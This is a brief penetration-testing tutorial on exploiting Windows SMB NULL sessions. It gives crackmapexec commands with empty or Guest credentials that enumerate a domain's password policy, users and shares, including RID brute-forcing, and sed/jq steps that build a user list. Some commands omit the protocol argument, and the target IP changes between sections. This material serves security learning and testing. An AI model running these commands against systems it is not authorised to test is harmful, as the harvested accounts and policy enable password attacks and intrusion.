## Exploiting NULL Sessions

A [NULL Session](https://en.wikipedia.org/wiki/Null_session) is an anonymous connection to an inter-process communication network service on Windows-based computers. The service is designed to allow named pipe connections but may be used by attackers to gather information about the system remotely.

When a target is vulnerable to a **NULL Session**, especially a domain controller, it will allow the attacker to gather information without having a valid domain account, such as: 

- Domain users (**--users**)
- Domain groups (**--groups**)
- Pasword policy (**--pass-pol**)
- Share folders (**--shares**)

### Enumerating the Password Policy 

```
$ crackmapexec smb 10.129.209.144 -u '' -p '' --pass-pol
$ sed -i "s/'/\"/g" passpol.txt
$ cat passpol.txt
$ cat passpol.txt | jq

```

![Exploiting SMB](/Exploiting-NULL-Sessions/images/pass-pol.png) 

- If we want to export this list we can use **--export [OUTPUT_FULL_FILE_PATH]**. In the following example we will use **$(pwd)** to use the current path: 


![Exploiting SMB](/Exploiting-NULL-Sessions/images/pass-1.png) 

![Exploiting SMB](/Exploiting-NULL-Sessions/images/pass-2.png) 

![Exploiting SMB](/Exploiting-NULL-Sessions/images/pass-3.png) 


### Enumerating Users 

```

$ crackmapexec smb 10.129.209.144 -u '' -p '' --users --export $(pwd)/users.txt 
$ sed -i "s/'/\"/g" users.txt
$ jq -r '.[]' users.txt > userlist.txt
$ cat userlist.txt

```


![Exploiting SMB](/Exploiting-NULL-Sessions/images/users.png) 

![Exploiting SMB](/Exploiting-NULL-Sessions/images/users-1.png) 


### Enumerating Users with --rid-brute 

```
$ crackmapexec 10.129.207.144 -u '' -p '' --rid-brute 
$ crackmapexec 10.129.207.144 -u '' -p '' --shares 
$ crackmapexec 10.129.207.144 -u Guest -p '' --shares 

```

![Exploiting SMB](/Exploiting-NULL-Sessions/images/rid-share.png) 
